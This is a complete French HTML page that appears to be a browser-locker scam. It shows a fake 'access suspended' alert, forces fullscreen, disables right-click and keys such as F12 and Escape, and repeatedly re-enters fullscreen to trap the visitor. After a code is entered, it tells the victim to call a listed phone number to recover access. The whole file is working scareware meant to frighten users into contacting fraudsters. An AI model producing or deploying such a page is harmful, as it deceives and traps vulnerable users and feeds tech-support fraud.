<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Alerte Système</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        html, body {
            width: 100%;
            height: 100%;
            background: white;
            color: black;
            font-family: Arial, sans-serif;
            text-align: center;
            overflow: hidden;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .message {
            font-size: 3rem;
            font-weight: bold;
            width: 80%;
        }
        #codeInput {
            margin-top: 20px;
            padding: 10px;
            font-size: 2rem;
            text-align: center;
            border: 2px solid black;
        }
        #error-message {
            color: red;
            font-size: 1.5rem;
            margin-top: 10px;
        }
    </style>
</head>
<body>

    <div class="message">
        <p>⚠️ Votre accès est temporairement suspendu ⚠️<br>Veuillez entrer le code de récupération</p>
        <input type="password" id="codeInput" placeholder="Code secret">
        <p id="error-message"></p>
    </div>

    <script>
        // Ouvrir en plein écran automatiquement
        function openFullscreen() {
            let elem = document.documentElement;
            if (elem.requestFullscreen) {
                elem.requestFullscreen();
            } else if (elem.mozRequestFullScreen) { // Firefox
                elem.mozRequestFullScreen();
            } else if (elem.webkitRequestFullscreen) { // Chrome, Safari, Opera
                elem.webkitRequestFullscreen();
            } else if (elem.msRequestFullscreen) { // IE/Edge
                elem.msRequestFullscreen();
            }
        }
        openFullscreen(); // Tente de forcer le plein écran

        // Désactiver le clic droit
        document.addEventListener("contextmenu", event => event.preventDefault());

        // Désactiver certaines touches (Alt+F4, F12, etc.)
        document.addEventListener("keydown", function(event) {
            if (["F12", "Escape", "Alt", "Meta", "Control", "Shift"].includes(event.key)) {
                event.preventDefault();
            }
        });

        // Vérifier si la fenêtre est fermée ou réduite (empêcher de quitter facilement)
        setInterval(() => {
            if (document.hidden) {
                openFullscreen();
            }
        }, 500);

        // Code secret pour débloquer
        document.getElementById("codeInput").addEventListener("keyup", function(event) {
            if (event.key === "Enter") {
                if (this.value === "1234") {  // Change le code ici
                    document.body.innerHTML = "<h1 style='color: black; text-align: center; margin-top: 20%;'>Contactez ce numéro pour récupérer votre accès : <br><span style='color: red; font-size: 2rem;'>+33 7 56 75 43 88</span></h1>";
                } else {
                    document.getElementById("error-message").innerText = "Code incorrect !";
                    this.value = "";
                }
            }
        });
    </script>

</body>
</html>
